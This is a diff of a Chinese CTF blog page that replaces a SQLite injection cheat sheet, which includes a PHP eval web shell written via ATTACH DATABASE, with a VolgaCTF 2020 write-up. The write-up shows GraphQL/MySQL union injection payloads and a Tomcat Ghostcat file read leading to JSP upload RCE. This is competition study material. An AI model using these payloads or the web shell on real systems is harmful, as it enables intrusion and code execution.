@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlite, M0on&#39;s Blog">
-    <meta name="description" content="不忘初心">
+    <meta name="keywords" content="VolgaCTF2020 Qualifier部分writeup, M0on&#39;s Blog">
+    <meta name="description" content="周末一个人打了一下，太菜了，做了两题web记录一下">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqlite | M0on&#39;s Blog</title>
+    <title>VolgaCTF2020 Qualifier部分writeup | M0on&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -232,12 +232,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/24.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sqlite</h1>
+                    <h1 class="description center-align post-title">VolgaCTF2020 Qualifier部分writeup</h1>
                 </div>
             </div>
         </div>
@@ -358,8 +358,8 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/sql/">
-                                <span class="chip bg-color">sql</span>
+                            <a href="/tags/writeup/">
+                                <span class="chip bg-color">writeup</span>
                             </a>
                         
                     </div>
@@ -383,7 +383,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-14
+                    2020-03-30
                 </div>
                 
 
@@ -392,14 +392,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    5 分
                 </div>
                 
 
@@ -415,224 +415,184 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p><em>sqlite没有if和sleep语句</em></p>
-<h3 id="sqlite的-是拼接字符串"><a href="#sqlite的-是拼接字符串" class="headerlink" title="sqlite的||是拼接字符串"></a>sqlite的||是拼接字符串</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> select 123||4;
-1234    </code></pre>
-<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>–空格</p>
-<p>/* */</p>
-<h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p><code>select column1 from table where 1=1 and 2=2</code></p>
-<h3 id="sqlite数据类型"><a href="#sqlite数据类型" class="headerlink" title="sqlite数据类型"></a>sqlite数据类型</h3><ul>
-<li>null</li>
-<li>integer</li>
-<li>real 浮点数</li>
-<li>text 文本字符串 (utf-8,utf-16be或utf-16le 存储)</li>
-<li>BLOB blob根据输入存储</li>
-</ul>
-<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库-sqlite3-test-db"><a href="#创建数据库-sqlite3-test-db" class="headerlink" title="创建数据库: $sqlite3 test.db"></a>创建数据库: <code>$sqlite3 test.db</code></h4><p>会在当前目录创建 test.db</p>
-<pre><code>sqlite&gt; .databases #检查是否在数据库列表
-main: /root/download/test.db</code></pre><h4 id="ATTACH附加数据库，如果没有则会创建"><a href="#ATTACH附加数据库，如果没有则会创建" class="headerlink" title="ATTACH附加数据库，如果没有则会创建"></a>ATTACH附加数据库，如果没有则会创建</h4><ul>
-<li>可以利用这个来写shell<pre class=" language-aidl"><code class="language-aidl">sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';
-sqlite> .database
-main: /root/download/test.db
-haah: /root/download/shell.db</code></pre>
-</li>
-</ul>
-<h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> .dump #显示
-PRAGMA foreign_keys=OFF;
-BEGIN TRANSACTION;
-COMMIT;</code></pre>
-<pre class=" language-aidl"><code class="language-aidl">$sqlite3 testdb.db .dump >123.sql #导出到文件中 </code></pre>
-<h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="table"><a href="#table" class="headerlink" title=".table"></a>.table</h4><p>查看表</p>
-<h4 id="insert，select，update和mysql类似"><a href="#insert，select，update和mysql类似" class="headerlink" title="insert，select，update和mysql类似"></a>insert，select，update和mysql类似</h4><h4 id="create-table"><a href="#create-table" class="headerlink" title="create table"></a>create table</h4><pre class=" language-aidl"><code class="language-aidl">CREATE TABLE `vote` (
-  `id` INTEGER PRIMARY KEY AUTOINCREMENT,
-  `name` TEXT NOT NULL,
-  `count` INTEGER
-);</code></pre>
-<h4 id="insert-table"><a href="#insert-table" class="headerlink" title="insert table"></a>insert table</h4><pre class=" language-aidl"><code class="language-aidl">INSERT INTO `vote` (`name`, `count`) VALUES
-  ('dog', 0),
-  ('cat', 0),
-  ('zebra', 0),
-  ('koala', 0);</code></pre>
-<h3 id="GLOB-类似like"><a href="#GLOB-类似like" class="headerlink" title="GLOB  类似like"></a>GLOB  类似like</h3><p>GLOB对大小写敏感，而且使用linux的符号 </p>
-<ul>
-<li>*</li>
-</ul>
-<ul>
-<li>?</li>
-</ul>
-<pre><code>sqlite&gt; select * from vote where name GLOB 'do?';
-id          name        count     
-----------  ----------  ----------
-1           dog         0
-</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="abs"><a href="#abs" class="headerlink" title="abs()"></a>abs()</h4><p>如果整数是<code>-9223372036854775808</code>会溢出错误</p>
-<h4 id="coalesce-可以多个参数，返回第一个不是null的参数"><a href="#coalesce-可以多个参数，返回第一个不是null的参数" class="headerlink" title="coalesce()可以多个参数，返回第一个不是null的参数"></a>coalesce()可以多个参数，返回第一个不是null的参数</h4><pre class=" language-cookie"><code class="language-cookie">select coalesce(null,'a','abbbb');
-coalesce(null,'a','a')
-----------------------
-a         </code></pre>
-<pre class=" language-cookie"><code class="language-cookie">select coalesce(nullif(2,2),'hah');
-coalesce(nullif(2,2),'hah')
----------------------------
-hah              </code></pre>
-<p>相当于 if 2=2 return hah else null</p>
-<h4 id="hex-char"><a href="#hex-char" class="headerlink" title="hex,char"></a>hex,char</h4><h4 id="nullif-和-ifnull"><a href="#nullif-和-ifnull" class="headerlink" title="nullif 和 ifnull"></a>nullif 和 ifnull</h4><ul>
-<li>nullif</li>
-</ul>
-<p>两个参数，nullif(a,b),如果a和b相等返回 null</p>
-<p>如果a和b不想等，返回 a</p>
-<ul>
-<li>ifnull </li>
-</ul>
-<p>和 <code>coalesce()</code>类似，不过只能两个参数，返回第一个非null</p>
-<p>如果都为null，返回null</p>
-<h4 id="instr-a-b"><a href="#instr-a-b" class="headerlink" title="instr(a,b)"></a>instr(a,b)</h4><p>返回<code>b</code>在<code>a</code>出现的位置</p>
-<h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><h4 id="lower和-upper"><a href="#lower和-upper" class="headerlink" title="lower和 upper"></a>lower和 upper</h4><h4 id="max-a-b"><a href="#max-a-b" class="headerlink" title="max(a,b)"></a>max(a,b)</h4><h4 id="like-a-b"><a href="#like-a-b" class="headerlink" title="like(a,b)"></a>like(a,b)</h4><p>相当于 <code>b</code> like <code>a</code></p>
-<p>可以用 _ % </p>
-<pre><code>sqlite&gt; select like('ab_','abc');
-like('ab_','abc')
------------------
-1          </code></pre><ul>
-<li>like可以有第三个参数，</li>
-</ul>
-<p>相当于like语句的 ESCAPE ，转义</p>
-<p>在 <code>%</code> 或者 <code>_</code> 前面添加什么字符可以把 <code>%</code>或者 <code>_</code>当作字符串</p>
-<p>而不是匹配符号 </p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select like('barz_','bar_','z');
-like('barz_','bar_','z')
-------------------------
-1             </code></pre>
-<p>这里把 z 用作 和 \ 类似的作用</p>
-<h4 id="ltrim-a-和-ltrim-a-b"><a href="#ltrim-a-和-ltrim-a-b" class="headerlink" title="ltrim(a) 和 ltrim(a,b)"></a>ltrim(a) 和 ltrim(a,b)</h4><p>删除左侧字符串</p>
-<ul>
-<li>一个参数 返回删除左侧空格的字符串</li>
-<li>两个参数 a,b ，返回删除空格和第二个参数<code>b</code>字符串<pre class=" language-cookie"><code class="language-cookie">sqlite> SELECT ltrim('aaaa bc','a');
-ltrim('aaaa bc','a')
-bc</code></pre>
-</li>
-</ul>
-<h4 id="rtrim-a-和-rtrim-a-b-和ltrim类似"><a href="#rtrim-a-和-rtrim-a-b-和ltrim类似" class="headerlink" title="rtrim(a)和 rtrim(a,b) 和ltrim类似"></a>rtrim(a)和 rtrim(a,b) 和ltrim类似</h4><h4 id="trim-就是-rtrim-ltrim"><a href="#trim-就是-rtrim-ltrim" class="headerlink" title="trim 就是 rtrim + ltrim"></a>trim 就是 rtrim + ltrim</h4><h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>和普通的 格式化字符串一样 ，</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select printf("aw%s",'sl');
-printf("aw%s",'sl')
-awsl</code></pre>
-<h4 id="quote-a"><a href="#quote-a" class="headerlink" title="quote(a)"></a>quote(a)</h4><p>将字符串 带上 ‘ ‘ </p>
-<pre class=" language-cookie"><code class="language-cookie">平常：
-sqlite> select 1233;
-1233      
-----------
-1233      
-
-quote:
-sqlite> SELECT quote('1233');
-quote('1233')
--------------
-'1233'    </code></pre>
-<h4 id="random"><a href="#random" class="headerlink" title="random()"></a>random()</h4><p>返回随机数</p>
-<h4 id="randomblob-a"><a href="#randomblob-a" class="headerlink" title="randomblob(a)"></a>randomblob(a)</h4><p>返回 a个字节的 blob</p>
-<p>如果很长可以造成时间盲注</p>
-<h4 id="replace-a-b-c"><a href="#replace-a-b-c" class="headerlink" title="replace(a,b,c)"></a>replace(a,b,c)</h4><p>把 a中的 b换成c</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select replace('a{ab}','a','b');
-replace('a{ab}','a','b')
-------------------------
-b{bb}            </code></pre>
-<h4 id="soundex"><a href="#soundex" class="headerlink" title="soundex()"></a>soundex()</h4><p>返回字符串的 <code>soundex</code>编码 ，很迷</p>
-<p>开眼界了</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select soundex('a');
-soundex('a')
-------------
-A000       </code></pre>
-<h4 id="sqlite-version-版本"><a href="#sqlite-version-版本" class="headerlink" title="sqlite_version() 版本"></a>sqlite_version() 版本</h4><h4 id="substr-和mysql"><a href="#substr-和mysql" class="headerlink" title="substr() 和mysql"></a>substr() 和mysql</h4><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>返回字符串类型</p>
-<h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode()"></a>unicode()</h4><p>返回第一个字符的<code>unicode</code> 数字</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select unicode('a');
-unicode('a')
-------------
-97         
-
-sqlite> select unicode('哈');
-unicode('哈')
-------------
-21704     </code></pre>
-<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="写shell-需要叠堆注入"><a href="#写shell-需要叠堆注入" class="headerlink" title="写shell 需要叠堆注入"></a>写shell 需要叠堆注入</h3><pre class=" language-aidl"><code class="language-aidl">ATTACH DATABASE '/tmp/good.php' as 'm0on';
-CREATE TABLE m0on.shell_haha(`haha` text);
-INSERT INTO m0on.shell_haha (haha) VALUES ('<?php eval($_POST[cmd]);?>');
-</code></pre>
-<p>cat /tmp/good.php</p>
-<pre><code>��A&lt;?php eval($_POST[cmd]);?&gt;</code></pre><h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><pre class=" language-cookie"><code class="language-cookie">select name from sqlite_master where type='table';
-select tbl_name from sqlite_master where type='table';</code></pre>
-<h3 id="获取-表的结构，包括列名"><a href="#获取-表的结构，包括列名" class="headerlink" title="获取 表的结构，包括列名"></a>获取 表的结构，包括列名</h3><pre class=" language-cookie"><code class="language-cookie">select sql from sqlite_master where name='表名';
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，才水了两道题</p>
+<h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>注册登录，看到请求：</p>
+<p>登录的:</p>
+<pre><code>{"query":"query login($input: LoginUser) {\n  login(user: $input) {\n  token login name email \n  }\n}\n","variables":{"input":{"login":"123","password":"123"}}}
+</code></pre><p>登录后的</p>
+<pre><code>{"query":"query {books{pic \n author }}"}</code></pre><p>是用了<code>graphQL</code></p>
+<p>可以<code>graphQL注入</code></p>
+<pre><code>{"query":"query {__schema {types{ name } mutationType{name}}}"}</code></pre><p>然后得到详细情况</p>
+<pre><code>{"query":"query {  __type(name: \"Query\") { name fields (includeDeprecated: true){ name type { name kind ofType{name kind description}}}}}"}</code></pre><p>看到有一个 <code>testGetUsersByFilter</code></p>
+<p>然后看到它的 <code>oftype</code>等情况</p>
+<p>得到用法，和登录的那个类似</p>
+<pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"admin","email":"or","name":"yuewuhen"}}}</code></pre><p>发现可以查询，</p>
+<p>那么尝试是否有<code>mysql</code>或者<code>sqlite</code>等注入点</p>
+<p>FUZZ后发现单引号被过滤了</p>
+<p>那么应该是<code>sql</code>注入，而且查询的情况是使用了<code>or</code>查询</p>
+<p>所以可以考虑用 <code>\\</code> 来注入</p>
+<p>然后<code>FUZZ</code>发现是使用了<code>mysql</code>，而且空格被过滤了</p>
+<p>最后就是简单的mysql注入了：</p>
+<pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"order/**/by/**/6;#"}}}
+</code></pre><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"union/**/select/**/1,(select/**/flag/**/from/**/flag),3,4,5,6#"}}}
+</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/library.png" alt=""></p>
+<h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>打开是一个 <code>html</code>页面 什么都没有，<code>FUZZ</code>报错发现是</p>
+<p><code>tomcat/9.0.24</code></p>
+<p>前几天刚复现了<code>cve-2020-1938</code> 的<code>tomcat</code>漏洞</p>
+<p>可以任意文件读取，如果有上传甚至可以<code>RCE</code></p>
+<p>猜测<code>webapp</code>叫做<code>NetCorp</code>,</p>
+<p>先查看<code>web.xml</code></p>
+<p>外国的比赛加个 <code>proxychains</code>快点</p>
+<pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp WEB-INF/web.xml  netcorp.q.2020.volgactf.ru </code></pre><p>web.xml</p>
+<pre><code>&lt;web-app&gt;
+  &lt;display-name&gt;NetCorp&lt;/display-name&gt;
 
 
-sqlite> select sql from sqlite_master where name='shell';
-sql                             
---------------------------------
-CREATE TABLE shell(first,second)
+  &lt;servlet&gt;
+      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;
+      &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;
+      &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
 
-列名是 first 和 second</code></pre>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="substr-unicode"><a href="#substr-unicode" class="headerlink" title="substr ,unicode"></a>substr ,unicode</h4><pre class=" language-cookie"><code class="language-cookie">select unicode(substr('abc',1,1));
-select substr('abc',1,1);</code></pre>
-<p>使用<code>unicode()</code> 类似于 mysql的<code>ascii()</code></p>
-<h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><pre class=" language-cookie"><code class="language-cookie">select like('a%','abc');</code></pre>
-<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>需要扩展</p>
-<pre class=" language-cookie"><code class="language-cookie">apt-get install sqlite3-pcre</code></pre>
-<p>或者</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite>  .load /usr/lib/sqlite3/pcre.so</code></pre>
-<p>语句类似mysql不说了</p>
-<h4 id="GLOB"><a href="#GLOB" class="headerlink" title="GLOB"></a>GLOB</h4><p>类似<code>like</code>，不过用的是unix的 * ?</p>
-<pre class=" language-cookie"><code class="language-cookie">select 'abc' GLOb 'a*'; 
-'abc' GLOb 'a*'
----------------
-1          </code></pre>
-<h4 id="nullif-和-instr"><a href="#nullif-和-instr" class="headerlink" title="nullif 和 instr()"></a>nullif 和 instr()</h4><p>instr(a,b) 返回 b第一次出现在a的地方 ，</p>
-<p>和<code>nullif()</code>一起用 如果是出现在<code>1</code>就返回null</p>
-<pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','z'),1); //0 </code></pre>
-<p>如果没有匹配到会返回<code>0</code>,这就和null一样效果</p>
-<p>为了防止这种情况，在后面加上 <code>||1</code> 拼接字符串</p>
-<pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','b'),1)||1; // 21
-select nullif(instr('abca','a'),1)||1;  //null
-select nullif(instr('abca','ab'),1)||1; //null</code></pre>
-<h4 id="利用-ltrim-和length-注入"><a href="#利用-ltrim-和length-注入" class="headerlink" title="利用 ltrim() 和length() 注入"></a>利用 ltrim() 和length() 注入</h4><p>使用<code>length()</code>获取字段的长度</p>
-<pre class=" language-cookie"><code class="language-cookie">select length("vote")=4;</code></pre>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select length(ltrim("vote","vo"))=2;</code></pre>
-<p>然后<code>ltrim()</code> 函数从左往右爆破字符串，</p>
-<p>如果爆破的字符串正确，那么length就会减少</p>
-<h4 id="同理-rtrim-trim-和-length"><a href="#同理-rtrim-trim-和-length" class="headerlink" title="同理 rtrim()/trim()和 length()"></a>同理 rtrim()/trim()和 length()</h4><h4 id="replace-和length-注入"><a href="#replace-和length-注入" class="headerlink" title="replace()和length()注入"></a>replace()和length()注入</h4><p>最好前面有标识符号，<code>flag{</code> 这样<br>和 ltrim 和 rtrim类似<br>不然麻烦</p>
-<pre class=" language-cookie"><code class="language-cookie">select  
-length(replace('flag{aza}','flag{a',''))=3;
-//1 
+  &lt;servlet-mapping&gt;
+      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;
+      &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
 
-select length(replace('flag{aza}','flag{b',''))=3;
-//0</code></pre>
-<h4 id="ltrim-和-length-和nullif"><a href="#ltrim-和-length-和nullif" class="headerlink" title="ltrim() 和 length()和nullif()"></a>ltrim() 和 length()和nullif()</h4><pre class=" language-cookie"><code class="language-cookie">select nullif(length(ltrim("vote","vo")),2);</code></pre>
-<p>nullif 和 length 和ltrim 配合</p>
-<p>如果 正确返回<code>null</code></p>
-<h4 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h4><pre class=" language-cookie"><code class="language-cookie">select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1
-select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0</code></pre>
-<h4 id="利用abs-报错，ifnull-nullif"><a href="#利用abs-报错，ifnull-nullif" class="headerlink" title="利用abs()报错，ifnull(),nullif()"></a>利用abs()报错，ifnull(),nullif()</h4><ul>
-<li><p>ifnull可以用<code>coalesce()</code>函数代替</p>
-</li>
-<li><p><code>abs()</code>函数存在整形溢出</p>
-</li>
-<li><p>当abs()参数是<code>-9223372036854775808</code>也就是<code>0x8000000000000000</code><br>就会报错</p>
-<pre class=" language-cookie"><code class="language-cookie">sqlite> select abs(0x99999999999999999);
-Error: hex literal too big: 0x99999999999999999</code></pre>
-<p>所以基于报错的注入：</p>
-</li>
-</ul>
-<p>通过nullif和ifnull来决定是否报错<br>如果 <code>1=1</code> 就报错</p>
-<pre class=" language-cookie"><code class="language-cookie">select abs(ifnull(nullif(1,1),0x8000000000000000));
-Error: integer overflow
 
-select abs(ifnull(nullif(1,2),0x8000000000000000));
-2</code></pre>
-<h3 id="时间盲注-randomblob"><a href="#时间盲注-randomblob" class="headerlink" title="时间盲注 randomblob()"></a>时间盲注 randomblob()</h3><p>randomblob(n)可以产生n长度的字符串，足够长就可以延时</p>
-<pre class=" language-cookie"><code class="language-cookie">select case when substr('abc',1,1)='a' 
-then randomblob(1000000) 
-else 0 end;</code></pre>
-<h3 id="CREATE注入"><a href="#CREATE注入" class="headerlink" title="CREATE注入"></a>CREATE注入</h3><p>语句 :</p>
-<pre><code>create table [xx] as select</code></pre><pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><p>这样就是 <code>(123</code> 为列名， type 默认是 TEXT</p>
-<p>创造一个表 <code>aa</code> ，</p>
-<p>数据是从 <code>sec_tb</code> 的 <code>a1</code>列 复制过去的数据</p>
-<p><strong>获取表:</strong></p>
-<pre><code>CREATE TABLE [cc] as select [sql][(123] from sqlite_master ;</code></pre><p><strong>获取数据</strong></p>
-<pre><code>CREATE TABLE aa as select [a1][(123] from sec_tb ;</code></pre><script>
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;
+        &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;
+        &lt;description&gt;Complaint info&lt;/description&gt;
+        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+
+    &lt;error-page&gt;
+        &lt;error-code&gt;404&lt;/error-code&gt;
+        &lt;location&gt;/404.html&lt;/location&gt;
+    &lt;/error-page&gt;
+
+
+
+&lt;/web-app&gt;</code></pre><p>很明显了，查看一下代码</p>
+<pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class netcorp.q.2020.volgactf.ru 
+</code></pre><p><strong>代码</strong></p>
+<pre><code>//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by Fernflower decompiler)
+//
+
+package ru.volgactf.netcorp;
+
+import java.io.File;
+import java.io.IOException;
+import java.io.PrintWriter;
+import java.math.BigInteger;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.Iterator;
+import javax.servlet.ServletConfig;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.MultipartConfig;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.Part;
+
+@MultipartConfig
+public class ServeScreenshotServlet extends HttpServlet {
+    private static final String SAVE_DIR = "uploads";
+
+    public ServeScreenshotServlet() {
+        System.out.println("ServeScreenshotServlet Constructor called!");
+    }
+
+    public void init(ServletConfig config) throws ServletException {
+        System.out.println("ServeScreenshotServlet \"Init\" method called");
+    }
+
+    public void destroy() {
+        System.out.println("ServeScreenshotServlet \"Destroy\" method called");
+    }
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        String appPath = request.getServletContext().getRealPath("");
+        String savePath = appPath + "uploads";
+        File fileSaveDir = new File(savePath);
+        if (!fileSaveDir.exists()) {
+            fileSaveDir.mkdir();
+        }
+
+        String submut = request.getParameter("submit");
+        if (submut != null &amp;&amp; !submut.equals("true")) {
+        }
+
+        Iterator var7 = request.getParts().iterator();
+
+        while(var7.hasNext()) {
+            Part part = (Part)var7.next();
+            String fileName = this.extractFileName(part);
+            fileName = (new File(fileName)).getName();
+            String hashedFileName = this.generateFileName(fileName);
+            String path = savePath + File.separator + hashedFileName;
+            if (!path.equals("Error")) {
+                part.write(path);
+            }
+        }
+
+        PrintWriter out = response.getWriter();
+        response.setContentType("application/json");
+        response.setCharacterEncoding("UTF-8");
+        out.print(String.format("{'success':'%s'}", "true"));
+        out.flush();
+    }
+
+    private String generateFileName(String fileName) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("MD5");
+            md.update(fileName.getBytes());
+            byte[] digest = md.digest();
+            String s2 = (new BigInteger(1, digest)).toString(16);
+            StringBuilder sb = new StringBuilder(32);
+            int i = 0;
+
+            for(int count = 32 - s2.length(); i &lt; count; ++i) {
+                sb.append("0");
+            }
+
+            return sb.append(s2).toString();
+        } catch (NoSuchAlgorithmException var8) {
+            var8.printStackTrace();
+            return "Error";
+        }
+    }
+
+    private String extractFileName(Part part) {
+        String contentDisp = part.getHeader("content-disposition");
+        String[] items = contentDisp.split(";");
+        String[] var4 = items;
+        int var5 = items.length;
+
+        for(int var6 = 0; var6 &lt; var5; ++var6) {
+            String s = var4[var6];
+            if (s.trim().startsWith("filename")) {
+                return s.substring(s.indexOf("=") + 2, s.length() - 1);
+            }
+        }
+
+        return "";
+    }
+}
+
+</code></pre><p>文件名经过<code>md5</code></p>
+<p>那就上传<code>jsp</code>文件，然后<code>rce</code>了</p>
+<pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  uploads/d17faea05c8d3f2ff9b5f67f6fa0e7a6 netcorp.q.2020.volgactf.ru</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/netcorp.png" alt=""></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -675,7 +635,7 @@ else 0 end;</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/02/14/sqlite/">http://yoursite.com/2020/02/14/sqlite/</a>
+                    <a href="http://yoursite.com/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/">http://yoursite.com/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -717,8 +677,8 @@ else 0 end;</code></pre>
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/sql/">
-                                    <span class="chip bg-color">sql</span>
+                                <a href="/tags/writeup/">
+                                    <span class="chip bg-color">writeup</span>
                                 </a>
                             
                         </div>
@@ -759,9 +719,64 @@ else 0 end;</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.png" class="responsive-img" alt="VolgaCTF2020 Qualifier部分writeup">
+                        
+                        <span class="card-title">VolgaCTF2020 Qualifier部分writeup</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            周末一个人打了一下，太菜了，做了两题web记录一下
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/writeup/">
+                        <span class="chip bg-color">writeup</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2020/02/24/gyctf2020-writeup/">
                     <div class="card-image">
@@ -779,9 +794,9 @@ else 0 end;</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -805,43 +820,6 @@ else 0 end;</code></pre>
                         <span class="chip bg-color">writeup</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/02/10/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
